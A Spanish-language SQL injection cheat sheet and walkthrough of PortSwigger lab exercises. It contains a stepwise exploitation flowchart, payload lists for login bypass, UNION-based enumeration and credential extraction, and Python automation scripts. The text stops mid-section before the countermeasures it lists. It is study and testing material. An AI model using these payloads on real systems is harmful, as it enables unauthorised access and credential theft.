# SQL INJECTION CHEAT SHEET
## Guía Completa de Pentesting y QA Testing

**Autor:** Sr. Arévalo  
**Fecha:** Noviembre 2025  
**Versión:** 1.0  
**Fuente:** PortSwigger Web Security Academy Labs

---

## TABLA DE CONTENIDOS

1. [Metodología de Explotación](#1-metodología-de-explotación)
2. [Orden de Prácticas](#2-orden-de-prácticas)
3. [Fundamentos Teóricos](#3-fundamentos-teóricos)
4. [Prácticas - Nivel Básico](#4-prácticas---nivel-básico)
5. [Prácticas - Nivel Intermedio](#5-prácticas---nivel-intermedio)
6. [Prácticas - Nivel Avanzado](#6-prácticas---nivel-avanzado)
7. [Comandos Base de Explotación](#7-comandos-base-de-explotación)
8. [Perspectiva QA](#8-perspectiva-qa)
9. [Contramedidas](#9-contramedidas)
10. [Referencias](#10-referencias)

---

## 1. METODOLOGÍA DE EXPLOTACIÓN

### 1.1 Flowchart General de Explotación

```
INICIO
│
├─► PASO 1: DETECTAR VULNERABILIDAD
│   │
│   ├─► Inyectar: '
│   │   ├─► ¿Error SQL? → SÍ → VULNERABLE → Ir a PASO 2
│   │   └─► ¿Error SQL? → NO → Inyectar: ' OR '1'='1
│   │       ├─► ¿Comportamiento diferente? → SÍ → VULNERABLE → Ir a PASO 2
│   │       └─► ¿Comportamiento diferente? → NO → NO VULNERABLE → FIN
│   │
├─► PASO 2: IDENTIFICAR DBMS
│   │
│   ├─► Ejecutar: '+UNION+SELECT+NULL+FROM+dual--
│   │   ├─► ¿Funciona sin error? → SÍ → ES ORACLE → Ir a LÍNEA 520
│   │   └─► ¿Funciona sin error? → NO → Ir a siguiente prueba
│   │
│   ├─► Ejecutar: '+UNION+SELECT+@@version,+NULL#
│   │   ├─► ¿Respuesta contiene "MySQL" o "MariaDB"? → SÍ → ES MYSQL → Ir a LÍNEA 580
│   │   └─► ¿Respuesta contiene "MySQL" o "MariaDB"? → NO → Ir a siguiente prueba
│   │
│   ├─► Ejecutar: '+UNION+SELECT+@@version,+NULL--
│   │   ├─► ¿Respuesta contiene "Microsoft"? → SÍ → ES MSSQL → Ir a LÍNEA 640
│   │   └─► ¿Respuesta contiene "Microsoft"? → NO → Ir a siguiente prueba
│   │
│   └─► Ejecutar: '+UNION+SELECT+version(),+NULL--
│       ├─► ¿Respuesta contiene "PostgreSQL"? → SÍ → ES POSTGRESQL → Ir a LÍNEA 700
│       └─► ¿Respuesta contiene "PostgreSQL"? → NO → Prueba manual o SQLMap
│
├─► PASO 3: DETERMINAR NÚMERO DE COLUMNAS
│   │
│   ├─► Ejecutar: '+UNION+SELECT+NULL--
│   │   └─► ¿Error? → SÍ → Incrementar columnas
│   │
│   ├─► Ejecutar: '+UNION+SELECT+NULL,NULL--
│   │   └─► ¿Error? → SÍ → Incrementar columnas
│   │
│   ├─► Ejecutar: '+UNION+SELECT+NULL,NULL,NULL--
│   │   └─► ¿Sin error? → SÍ → TIENE 3 COLUMNAS → Ir a PASO 4
│   │
│   └─► Continuar incrementando hasta que NO haya error
│
├─► PASO 4: IDENTIFICAR COLUMNAS STRING
│   │
│   ├─► Ejecutar: '+UNION+SELECT+'abc',NULL,NULL--
│   │   └─► ¿Error? → SÍ → Columna 1 NO es string
│   │
│   ├─► Ejecutar: '+UNION+SELECT+NULL,'abc',NULL--
│   │   └─► ¿Sin error? → SÍ → Columna 2 ES string → Usar esta columna
│   │
│   └─► Ejecutar: '+UNION+SELECT+NULL,NULL,'abc'--
│       └─► Probar todas las columnas hasta encontrar las de tipo string
│
├─► PASO 5: ENUMERAR ESTRUCTURA
│   │
│   ├─► SI ES ORACLE → Ejecutar: '+UNION+SELECT+table_name,NULL+FROM+all_tables--
│   │   └─► Anotar nombres de tablas (EN MAYÚSCULAS)
│   │
│   ├─► SI ES MYSQL/POSTGRESQL/MSSQL → Ejecutar: '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
│   │   └─► Anotar nombres de tablas
│   │
│   └─► Identificar tabla objetivo (ej: users, admin, credentials)
│
├─► PASO 6: ENUMERAR COLUMNAS DE TABLA OBJETIVO
│   │
│   ├─► SI ES ORACLE → Ejecutar: '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS'--
│   │   └─► Anotar nombres de columnas
│   │
│   └─► SI ES MYSQL/POSTGRESQL/MSSQL → Ejecutar: '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'--
│       └─► Anotar nombres de columnas (ej: username, password)
│
└─► PASO 7: EXTRAER DATOS
    │
    └─► Ejecutar: '+UNION+SELECT+username,+password+FROM+users--
        └─► Obtener credenciales → EXPLOTACIÓN COMPLETADA → FIN
```

---

### 1.2 Árbol de Decisión Rápido

**¿Qué hago primero?**

```
1. ¿Tengo error SQL al inyectar '?
   ├─ SÍ → Vulnerable → Continúa
   └─ NO → Prueba ' OR '1'='1 → ¿Cambió el comportamiento?
       ├─ SÍ → Vulnerable → Continúa
       └─ NO → No vulnerable o protegido por WAF

2. ¿Necesito saber el DBMS?
   ├─ SÍ → Prueba FROM dual (Oracle) → ¿Funciona?
   │   ├─ SÍ → Oracle → Usa sintaxis Oracle
   │   └─ NO → Prueba @@version → ¿Qué dice?
   │       ├─ "MySQL" → MySQL → Usa #
   │       ├─ "Microsoft" → MSSQL → Usa --
   │       └─ "PostgreSQL" → PostgreSQL → Usa --
   └─ NO → Asumes MySQL/MSSQL genérico

3. ¿Cuántas columnas tiene la query?
   ├─ Prueba UNION SELECT NULL → Error
   ├─ Prueba UNION SELECT NULL,NULL → Error
   └─ Prueba UNION SELECT NULL,NULL,NULL → Sin error → 3 columnas

4. ¿Qué columnas aceptan texto?
   ├─ Columna 1: SELECT 'abc',NULL,NULL → ¿Error? → NO es string
   ├─ Columna 2: SELECT NULL,'abc',NULL → ¿Sin error? → ES string ✓
   └─ Columna 3: SELECT NULL,NULL,'abc' → Probar todas

5. ¿Dónde están las tablas?
   ├─ Oracle → all_tables
   └─ Otros → information_schema.tables

6. ¿Dónde están las columnas?
   ├─ Oracle → all_tab_columns
   └─ Otros → information_schema.columns

7. ¿Cómo extraigo datos?
   └─ UNION SELECT username,password FROM users--
```

---

### 1.3 Comandos de Diagnóstico Rápido

**Copiar y ejecutar en orden:**

```sql
-- TEST 1: Detectar vulnerabilidad
'

-- TEST 2: Confirmar inyección
' OR '1'='1

-- TEST 3: Identificar Oracle
'+UNION+SELECT+NULL+FROM+dual--

-- TEST 4: Identificar MySQL
'+UNION+SELECT+@@version,+NULL#

-- TEST 5: Identificar MSSQL
'+UNION+SELECT+@@version,+NULL--

-- TEST 6: Identificar PostgreSQL
'+UNION+SELECT+version(),+NULL--

-- TEST 7: Contar columnas (incrementar NULL hasta que funcione)
'+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--

-- TEST 8: Identificar columnas string (probar todas las posiciones)
'+UNION+SELECT+'abc',NULL,NULL--
'+UNION+SELECT+NULL,'abc',NULL--
'+UNION+SELECT+NULL,NULL,'abc'--
```

---

## 2. ORDEN DE PRÁCTICAS

### Secuencia de Aprendizaje

**NIVEL 1: BÁSICO (Apprentice)**
1. Lab 1: SQL injection vulnerability in WHERE clause
2. Lab 2: SQL injection vulnerability allowing login bypass

**NIVEL 2: INTERMEDIO (Practitioner - Técnica UNION)**
3. Lab 3: UNION attack, determining number of columns
4. Lab 4: UNION attack, finding a column containing text
5. Lab 5: UNION attack, retrieving data from other tables

**NIVEL 3: AVANZADO (Practitioner - Identificación DBMS)**
6. Lab 6: Querying database type and version on Oracle
7. Lab 7: Querying database type and version on MySQL
8. Lab 8: Listing database contents on non-Oracle databases
9. Lab 9: Listing database contents on Oracle

---

## 3. FUNDAMENTOS TEÓRICOS

### 3.1 ¿Qué es SQL Injection?

SQL Injection (SQLi) es una vulnerabilidad de seguridad que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Ocurre cuando:

1. La aplicación construye consultas SQL mediante concatenación de strings
2. La entrada del usuario NO es validada ni sanitizada
3. El usuario puede inyectar código SQL malicioso

**Ejemplo de código vulnerable:**

```python
# VULNERABLE
username = request.GET['username']
query = "SELECT * FROM users WHERE username = '" + username + "'"
cursor.execute(query)
```

**Entrada maliciosa del atacante:**
```
username = admin'--
```

**Query resultante:**
```sql
SELECT * FROM users WHERE username = 'admin'--'
```

El `--` comenta el resto de la query, eliminando cualquier validación adicional (como password).

---

### 3.2 Tipos de SQL Injection

**In-Band SQLi (clásica):**
- Error-based: Provoca errores SQL que revelan información
- UNION-based: Combina resultados de múltiples queries

**Inferential SQLi (Blind):**
- Boolean-based: Infiere información basándose en TRUE/FALSE
- Time-based: Infiere información basándose en delays

**Out-of-Band SQLi:**
- Exfiltra datos mediante canales alternativos (DNS, HTTP)

**En esta guía nos enfocamos en In-Band (UNION-based).**

---

### 3.3 Operador UNION

**Sintaxis SQL:**
```sql
SELECT columna1, columna2 FROM tabla1
UNION
SELECT columna1, columna2 FROM tabla2
```

**Requisitos para UNION:**
1. Mismo número de columnas en ambas queries
2. Tipos de datos compatibles en columnas correspondientes

**Uso en SQLi:**

Query original de la aplicación:
```sql
SELECT product_name, price FROM products WHERE category = 'Gifts'
```

Query inyectada por el atacante:
```sql
SELECT product_name, price FROM products WHERE category = '' 
UNION 
SELECT username, password FROM users--'
```

**Resultado:** La aplicación muestra productos Y credenciales de usuarios.

---

### 3.4 Comentarios SQL por DBMS

| DBMS | Comentario de Línea | Comentario de Bloque |
|------|---------------------|----------------------|
| MySQL | `-- ` (espacio), `#` | `/* */` |
| Oracle | `--` | `/* */` |
| PostgreSQL | `--` | `/* */` |
| MSSQL | `-- `, `#` | `/* */` |

**IMPORTANTE:** MySQL requiere espacio después de `--` para que funcione como comentario.

```sql
-- MySQL
admin'-- X  (NO funciona, falta espacio)
admin'-- ✓  (funciona con espacio)
admin'#     (funciona sin espacio)

-- Oracle/PostgreSQL/MSSQL
admin'--    (funciona sin espacio)
```

---

### 3.5 Tablas del Sistema por DBMS

**MySQL / PostgreSQL / MSSQL:**
```
information_schema
├── tables          → Información sobre todas las tablas
└── columns         → Información sobre todas las columnas
```

**Oracle:**
```
all_tables          → Información sobre tablas accesibles
all_tab_columns     → Información sobre columnas de tablas
v$version           → Versión de Oracle
```

---

## 4. PRÁCTICAS - NIVEL BÁSICO

### LAB 1: SQL Injection en WHERE Clause

**Objetivo:**  
Explotar una vulnerabilidad de SQL injection en el filtro de categorías de productos para mostrar productos no publicados (released = 0).

**Escenario:**  
La aplicación ejecuta la siguiente query:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

El parámetro `category` es vulnerable porque no está sanitizado.

---

**EXPLICACIÓN TÉCNICA:**

La aplicación filtra productos por categoría Y por estado de publicación. Solo muestra productos con `released = 1`. Nuestro objetivo es modificar la lógica de la query para que ignore la condición `released = 1`.

**Lógica del ataque:**

1. Cerramos la comilla de la cadena original: `'`
2. Añadimos una condición siempre verdadera: `OR 1=1`
3. Comentamos el resto de la query original: `--`

**Query antes de la inyección:**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Query después de la inyección:**
```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

La condición `OR 1=1` hace que toda la expresión WHERE sea TRUE, ignorando tanto la categoría como el estado de publicación.

---

**PASOS DE EXPLOTACIÓN:**

**PASO 1:** Interceptar la petición con Burp Suite

```http
GET /filter?category=Gifts HTTP/1.1
Host: vulnerable-app.com
```

**PASO 2:** Modificar el parámetro category

```
Payload a inyectar:
'+OR+1=1--
```

**PASO 3:** Enviar la petición modificada

```http
GET /filter?category='+OR+1=1-- HTTP/1.1
Host: vulnerable-app.com
```

**PASO 4:** Verificar resultados

La respuesta ahora incluye productos con `released = 0` (no publicados).

---

**COMANDOS BASE DE EXPLOTACIÓN:**

```sql
-- Payload básico
'+OR+1=1--

-- Variantes
' OR '1'='1
' OR 'x'='x
' OR 1=1#
' OR 1=1/*
' OR 'a'='a'--
```

**Cómo modificar estos comandos:**

- `'` → Cierra la comilla. Mantener siempre.
- `OR 1=1` → Condición siempre TRUE. Puede ser cualquier tautología.
- `--` → Comentario. Usar `#` para MySQL o `--` para otros DBMS.

---

**PERSPECTIVA QA:**

**Cómo detectar esta vulnerabilidad:**

1. Identificar parámetros que filtran datos (category, id, search)
2. Inyectar caracteres especiales: `'`, `"`, `--`, `#`
3. Observar cambios en la respuesta o mensajes de error SQL

**Evidencia de vulnerabilidad:**

- Cambio en cantidad de resultados mostrados
- Productos inesperados en la respuesta
- Mensajes de error SQL expuestos

**Reporte:**
```
SEVERIDAD: Alta
PARÁMETRO VULNERABLE: category
PAYLOAD: '+OR+1=1--
IMPACTO: Bypass de lógica de negocio, acceso a datos no autorizados
```

---

### LAB 2: Bypass de Autenticación (Login)

**Objetivo:**  
Explotar SQL injection en el formulario de login para autenticarse como el usuario `administrator` sin conocer su contraseña.

**Escenario:**  
La aplicación ejecuta:
```sql
SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT'
```

Ambos campos son vulnerables, pero solo necesitamos explotar `username`.

---

**EXPLICACIÓN TÉCNICA:**

El formulario de login valida credenciales con una consulta SQL. Si la query devuelve al menos un registro, la autenticación es exitosa.

**Lógica del ataque:**

1. Inyectamos en el campo `username` el valor: `administrator'--`
2. La comilla cierra el string del username
3. El comentario `--` elimina el resto de la query (verificación de password)

**Query antes de la inyección:**
```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'cualquier_cosa'
```

**Query después de la inyección:**
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'cualquier_cosa'
```

Todo lo que sigue a `--` es ignorado. La query solo verifica que el usuario `administrator` exista, sin validar contraseña.

---

**PASOS DE EXPLOTACIÓN:**

**PASO 1:** Interceptar la petición de login con Burp Suite

```http
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test123
```

**PASO 2:** Modificar el parámetro username

```
username=administrator'--
password=cualquier_cosa
```

**PASO 3:** Enviar la petición modificada

```http
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded

username=administrator'--&password=x
```

**PASO 4:** Verificar autenticación exitosa

```http
HTTP/1.1 200 OK
Set-Cookie: session=admin_token_12345
```

Si recibes una cookie de sesión o redirección a panel admin → ÉXITO.

---

**COMANDOS BASE DE EXPLOTACIÓN:**

```sql
-- Payload principal
administrator'--

-- Variantes para diferentes usuarios
admin'--
root'--
sa'--

-- Variantes con diferentes comentarios
administrator'#
administrator'/*

-- Login como primer usuario de la tabla
' OR '1'='1'--
' OR 1=1--

-- Bypass más agresivo (puede autenticarte como cualquier usuario)
admin' OR '1'='1
' OR 'x'='x
```

**Cómo modificar estos comandos:**

- Cambia `administrator` por el nombre de usuario objetivo
- Si `--` no funciona, prueba `#` (MySQL)
- Si quieres autenticarte como cualquier usuario, usa `' OR '1'='1'--`

---

**PERSPECTIVA QA:**

**Cómo detectar:**

1. Probar caracteres especiales en campos de login:
   - Username: `admin'`
   - Password: `cualquier_cosa`

2. Observar respuestas:
   - Error SQL → Vulnerable confirmado
   - Autenticación exitosa → Vulnerable explotable
   - Mensaje genérico → Posible protección

**Evidencia de vulnerabilidad crítica:**

```
REQUEST:
POST /login
username=administrator'--&password=x

RESPONSE:
HTTP/1.1 302 Found
Location: /admin
Set-Cookie: session=admin_session
```

**Reporte:**
```
SEVERIDAD: Crítica
CWE-89: SQL Injection
IMPACTO: Bypass completo de autenticación
REMEDIACIÓN: Implementar prepared statements
```

---

## 5. PRÁCTICAS - NIVEL INTERMEDIO

### LAB 3: UNION Attack - Determinar Número de Columnas

**Objetivo:**  
Usar técnica UNION para determinar cuántas columnas devuelve la query original.

**Escenario:**  
No sabemos cuántas columnas tiene la query original:
```sql
SELECT ??? FROM products WHERE category = 'USER_INPUT'
```

**¿Por qué es importante?**

UNION requiere que ambas queries tengan el MISMO número de columnas. Si intentamos hacer UNION con número incorrecto, obtendremos error.

---

**EXPLICACIÓN TÉCNICA:**

Usamos `NULL` como placeholder porque es compatible con CUALQUIER tipo de dato (string, integer, date, etc).

**Método de fuerza bruta:**

1. Empezamos con 1 columna: `UNION SELECT NULL`
2. Si obtenemos error → Incrementamos: `UNION SELECT NULL,NULL`
3. Repetimos hasta que NO haya error
4. Cuando funciona sin error → Hemos encontrado el número correcto

---

**PASOS DE EXPLOTACIÓN:**

**PASO 1:** Interceptar petición

```http
GET /filter?category=Gifts HTTP/1.1
```

**PASO 2:** Probar con 1 columna

```
Payload:
'+UNION+SELECT+NULL--
```

```http
GET /filter?category='+UNION+SELECT+NULL-- HTTP/1.1
```

**Respuesta esperada:**
```
ERROR: The used SELECT statements have a different number of columns
```

**PASO 3:** Probar con 2 columnas

```
Payload:
'+UNION+SELECT+NULL,NULL--
```

**Respuesta esperada:**
```
ERROR: The used SELECT statements have a different number of columns
```

**PASO 4:** Probar con 3 columnas

```
Payload:
'+UNION+SELECT+NULL,NULL,NULL--
```

**Respuesta esperada:**
```
HTTP/1.1 200 OK
(Sin error, página carga correctamente)
```

**CONCLUSIÓN:** La query original tiene 3 columnas.

---

**COMANDOS BASE DE EXPLOTACIÓN:**

```sql
-- Test con 1 columna
'+UNION+SELECT+NULL--

-- Test con 2 columnas
'+UNION+SELECT+NULL,NULL--

-- Test con 3 columnas
'+UNION+SELECT+NULL,NULL,NULL--

-- Test con 4 columnas
'+UNION+SELECT+NULL,NULL,NULL,NULL--

-- Test con 5 columnas
'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL--
```

**Continuar hasta N columnas según sea necesario.**

---

**MÉTODO ALTERNATIVO: ORDER BY**

```sql
-- Probar ordenar por columna 1
'+ORDER+BY+1--

-- Probar ordenar por columna 2
'+ORDER+BY+2--

-- Probar ordenar por columna 3
'+ORDER+BY+3--

-- Probar ordenar por columna 4
'+ORDER+BY+4--
```

**Si ORDER BY 3 funciona pero ORDER BY 4 da error → Tiene 3 columnas.**

---

**PERSPECTIVA QA:**

**Cómo automatizar esta detección:**

```python
import requests

url = "http://vulnerable-app.com/filter"
columns = 0
found = False

for i in range(1, 20):
    nulls = ',NULL' * i
    payload = f"'+UNION+SELECT{nulls}--"
    
    response = requests.get(url, params={'category': payload})
    
    if "error" not in response.text.lower():
        columns = i
        found = True
        break

if found:
    print(f"[+] Número de columnas: {columns}")
else:
    print("[-] No se pudo determinar el número de columnas")
```

---

### LAB 4: UNION Attack - Encontrar Columnas de Tipo String

**Objetivo:**  
Identificar qué columnas de la query original aceptan datos de tipo string (texto).

**Escenario:**  
Sabemos que la query tiene 3 columnas (del lab anterior), pero no sabemos cuáles aceptan strings.

**¿Por qué es importante?**

Solo podemos extraer datos textuales (nombres de usuario, tablas, passwords) desde columnas que sean de tipo STRING/VARCHAR.

---

**EXPLICACIÓN TÉCNICA:**

Sustituimos cada `NULL` por una cadena de texto y observamos si obtenemos error.

**Tipos de datos SQL:**
- INTEGER: Solo acepta números
- VARCHAR/TEXT: Acepta strings
- DATE: Solo acepta fechas
- DECIMAL: Solo acepta números decimales

Si intentamos poner un string en una columna INTEGER → ERROR.

---

**PASOS DE EXPLOTACIÓN:**

**PASO 1:** El laboratorio proporciona un string aleatorio

```
Ejemplo: aBcDeF
```

Este valor DEBE aparecer en la página cuando lo inyectemos correctamente.

**PASO 2:** Probar columna 1

```
Payload:
'+UNION+SELECT+'aBcDeF',NULL,NULL--
```

**Respuesta:**
```
ERROR: Conversion failed when converting the varchar value 'aBcDeF' to data type int
```

**CONCLUSIÓN:** Columna 1 NO es string (probablemente INTEGER).

**PASO 3:** Probar columna 2

```
Payload:
'+UNION+SELECT+NULL,'aBcDeF',NULL--
```

**Respuesta:**
```
HTTP/1.1 200 OK
(La página muestra el valor 'aBcDeF' en los resultados)
```

**CONCLUSIÓN:** Columna 2 SÍ es string ✓

**PASO 4:** Verificar columna 3 (opcional)

```
Payload:
'+UNION+SELECT+NULL,NULL,'aBcDeF'--
```

---

**COMANDOS BASE DE EXPLOTACIÓN:**

```sql
-- Probar columna 1
'+UNION+SELECT+'aBcDeF',NULL,NULL--

-- Probar columna 2
'+UNION+SELECT+NULL,'aBcDeF',NULL--

-- Probar columna 3
'+UNION+SELECT+NULL,NULL,'aBcDeF'--

-- Probar TODAS las columnas a la vez (si todas son string)
'+UNION+SELECT+'aBcDeF','aBcDeF','aBcDeF'--
```

**Modificar según:**
- Cambiar `'aBcDeF'` por el string proporcionado por el lab
- Ajustar número de columnas según el resultado del Lab 3

---

**PERSPECTIVA QA:**

**Script de automatización:**

```python
import requests

url = "http://vulnerable-app.com/filter"
columns = 3  # Del lab anterior
test_string = "aBcDeF"
string_columns = []

for i in range(columns):
    nulls = ['NULL'] * columns
    nulls[i] = f"'{test_string}'"
    
    payload = f"'+UNION+SELECT+{','.join(nulls)}--"
    response = requests.get(url, params={'category': payload})
    
    if test_string in response.text and "error" not in response.text.lower():
        string_columns.append(i + 1)
        print(f"[+] Columna {i + 1} acepta strings")

print(f"[+] Columnas string: {string_columns}")
```

---

### LAB 5: UNION Attack - Extraer Datos de Otras Tablas

**Objetivo:**  
Usar UNION para extraer datos de una tabla diferente (`users`) y autenticarse como `administrator`.

**Escenario:**  
- Sabemos que hay 2 columnas (ambas string)
- Existe una tabla llamada `users`
- La tabla tiene columnas `username` y `password`

---

**EXPLICACIÓN TÉCNICA:**

Una vez dominamos la técnica UNION, podemos combinar resultados de la query original con datos de CUALQUIER tabla de la base de datos.

**Query original:**
```sql
SELECT product_name, product_description FROM products WHERE category = 'Gifts'
```

**Query inyectada:**
```sql
SELECT product_name, product_description FROM products WHERE category = '' 
UNION 
SELECT username, password FROM users--'
```

**Resultado:** La aplicación muestra productos Y usuarios con contraseñas.

---

**PASOS DE EXPLOTACIÓN:**

**PASO 1:** Verificar número de columnas y tipo

Ya sabemos:
- 2 columnas
- Ambas aceptan strings

```
Payload de verificación:
'+UNION+SELECT+'abc','def'--
```

**PASO 2:** Extraer datos de la tabla users

```
Payload:
'+UNION+SELECT+username,+password+FROM+users--
```

```http
GET /filter?category='+UNION+SELECT+username,+password+FROM+users-- HTTP/1.1
```

**PASO 3:** Localizar credenciales del administrator en la respuesta

```html
<div class="product">
  <h3>administrator</h3>
  <p>s3cr3tP@ssw0rd</p>
</div>
<div class="product">
  <h3>carlos</h3>
  <p>secret456</p>
</div>
```

**PASO 4:** Usar las credenciales para login

```
Username: administrator
Password: s3cr3tP@ssw0rd
```

---

**COMANDOS BASE DE EXPLOTACIÓN:**

```sql
-- Extraer todos los usuarios y contraseñas
'+UNION+SELECT+username,+password+FROM+users--

-- Extraer solo el administrator
'+UNION+SELECT+username,+password+FROM+users+WHERE+username='administrator'--

-- Concatenar username y password en una sola columna
'+UNION+SELECT+NULL,CONCAT(username,':',password)+FROM+users--

-- Extraer emails
'+UNION+SELECT+username,+email+FROM+users--

-- Extraer más de 2 columnas (si la query original lo permite)
'+UNION+SELECT+username,+password,+email+FROM+users--
```

**Modificar según:**
- Nombres de columnas reales de la tabla
- Número de columnas de la query original
- Filtros WHERE para usuarios específicos

---

**PERSPECTIVA QA:**

**Impacto de esta vulnerabilidad:**

```
SEVERIDAD: Crítica
DATOS EXPUESTOS:
- Usernames
- Passwords (potencialmente en texto plano o hashed)
- Emails
- Cualquier dato sensible en la base de datos

IMPACTO NEGOCIO:
- Compromiso total de cuentas de usuario
- Violación de GDPR/regulaciones de privacidad
- Pérdida de confianza del cliente
```

**Cómo reportar:**

```markdown
## VULNERABILIDAD: SQL Injection con UNION Attack

**Endpoint vulnerable:** /filter?category=
**Parámetro:** category

**Evidencia:**
GET /filter?category='+UNION+SELECT+username,+password+FROM+users--

**Resultado:**
- Extracción exitosa de 15 usuarios con contraseñas
- Incluye cuentas administrativas
- Sin autenticación previa requerida

**Recomendación:**
Implementar prepared statements inmediatamente.
```

---

## 6. PRÁCTICAS - NIVEL AVANZADO

### LAB 6: Identificar Versión de Oracle Database

**Objetivo:**  
Usar UNION para determinar la versión exacta de Oracle Database.

**Particularidad de Oracle:**

TODAS las consultas SELECT en Oracle DEBEN incluir `FROM tabla`. Para consultas que no necesitan datos reales, existe una tabla especial llamada `dual`.

```sql
-- INCORRECTO en Oracle
SELECT @@version

-- CORRECTO en Oracle
SELECT BANNER FROM v$version
```

---

**EXPLICACIÓN TÉCNICA:**

Oracle almacena información de versión en vistas del sistema:
- `v$version` → Vista que contiene información detallada de versión
- `BANNER` → Columna que contiene el string de versión

**Vista v$version contiene:**
```
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
PL/SQL Release 19.0.0.0.0 - Production
CORE 19.0.0.0.0 Production
```

---

**PASOS DE EXPLOTACIÓN:**

**PASO 1:** Verificar que es Oracle Database

```
Payload de test:
'+UNION+SELECT+NULL,NULL+FROM+dual--
```

Si funciona sin error → Probablemente es Oracle.

**PASO 2:** Determinar número de columnas (con dual)

```
Payload:
'+UNION+SELECT+NULL+FROM+dual--
```

Error → Incrementar columnas.

```
Payload:
'+UNION+SELECT+NULL,NULL+FROM+dual--
```

Sin error → 2 columnas.

**PASO 3:** Identificar columnas string

```
Payload:
'+UNION+SELECT+'abc','def'+FROM+dual--
```

Si funciona → Ambas columnas son string.

**PASO 4:** Extraer versión de Oracle

```
Payload:
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

**Respuesta esperada:**
```html
<div class="product">
  <h3>Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production</h3>
  <p></p>
</div>
```

---

**COMANDOS BASE DE EXPLOTACIÓN:**

```sql
-- Extraer versión completa
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

-- Extraer solo primera línea de versión
'+UNION+SELECT+BANNER,+NULL+FROM+v$version+WHERE+ROWNUM=1--

-- Verificar que es Oracle (tabla dual)
'+UNION+SELECT+NULL,NULL+FROM+dual--

-- Información adicional del sistema
'+UNION+SELECT+user,+NULL+FROM+dual--
'+UNION+SELECT+ora_database_name,+NULL+FROM+dual--

-- Concatenar múltiples campos
'+UNION+SELECT+BANNER||'_'||NULL,+NULL+FROM+v$version--
```

---

**DIFERENCIAS ORACLE vs OTROS DBMS:**

| Característica | Oracle | MySQL/MSSQL/PostgreSQL |
|---------------|--------|------------------------|
| Tabla dummy | `FROM dual` (OBLIGATORIO) | No requerida |
| Versión | `BANNER FROM v$version` | `@@version` o `version()` |
| Comentario | `--` | `--` o `#` |
| Concatenación | `||` | `CONCAT()` o `+` |
| Case sensitivity | MAYÚSCULAS en nombres de tabla | Minúsculas generalmente |

---

**LÍNEA 520: ENUMERACIÓN COMPLETA EN ORACLE**

Si llegaste aquí desde el flowchart, significa que confirmaste que es Oracle.

**Secuencia de enumeración en Oracle:**

```sql
-- PASO 1: Confirmar Oracle con dual
'+UNION+SELECT+NULL,NULL+FROM+dual--

-- PASO 2: Obtener versión
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

-- PASO 3: Listar todas las tablas
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

-- PASO 4: Identificar tabla de usuarios (ejemplo: USERS_ABCDEF)
-- Buscar en la respuesta tablas con nombres como USERS, ADMIN, CREDENTIALS

-- PASO 5: Listar columnas de la tabla objetivo
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--

-- NOTA: Nombre de tabla EN MAYÚSCULAS obligatorio en Oracle

-- PASO 6: Extraer datos
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

---

### LAB 7: Identificar Versión de MySQL/Microsoft SQL Server

**Objetivo:**  
Determinar si la base de datos es MySQL o Microsoft SQL Server y obtener su versión.

**Diferencias clave:**

**MySQL:**
- Comentario: `#` (sin espacio requerido)
- Versión: `@@version` o `VERSION()`
- Respuesta típica: `5.7.33-0ubuntu0.16.04.1`

**Microsoft SQL Server:**
- Comentario: `--` (con espacio)
- Versión: `@@version`
- Respuesta típica: `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5`

---

**EXPLICACIÓN TÉCNICA:**

La variable global `@@version` existe tanto en MySQL como en MSSQL, pero devuelve strings diferentes:

**MySQL:**
```
5.7.33-0ubuntu0.16.04.1
10.3.27-MariaDB-1:10.3.27+maria~bionic
```

**MSSQL:**
```
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
Windows Server 2019 Datacenter
```

---

**PASOS DE EXPLOTACIÓN:**

**PASO 1:** Determinar número de columnas

```
Payload:
'+UNION+SELECT+NULL,NULL--
```

Asumimos 2 columnas.

**PASO 2:** Verificar columnas string

```
Payload:
'+UNION+SELECT+'abc','def'--
```

Sin comentario específico aún porque estamos probando.

**PASO 3A:** Probar sintaxis MySQL

```
Payload:
'+UNION+SELECT+@@version,+NULL#
```

**Respuesta si es MySQL:**
```html
<div class="product">
  <h3>5.7.33-0ubuntu0.16.04.1</h3>
  <p></p>
</div>
```

**PASO 3B:** Si 3A falla, probar sintaxis MSSQL

```
Payload:
'+UNION+SELECT+@@version,+NULL--
```

**Respuesta si es MSSQL:**
```html
<div class="product">
  <h3>Microsoft SQL Server 2019 (RTM) - 15.0.2000.5</h3>
  <p></p>
</div>
```

---

**COMANDOS BASE DE EXPLOTACIÓN:**

```sql
-- MySQL - Versión
'+UNION+SELECT+@@version,+NULL#
'+UNION+SELECT+VERSION(),+NULL#

-- MySQL - Información adicional
'+UNION+SELECT+@@version_comment,+NULL#
'+UNION+SELECT+DATABASE(),+NULL#
'+UNION+SELECT+USER(),+NULL#
'+UNION+SELECT+@@hostname,+NULL#

-- MSSQL - Versión
'+UNION+SELECT+@@version,+NULL--

-- MSSQL - Información adicional
'+UNION+SELECT+DB_NAME(),+NULL--
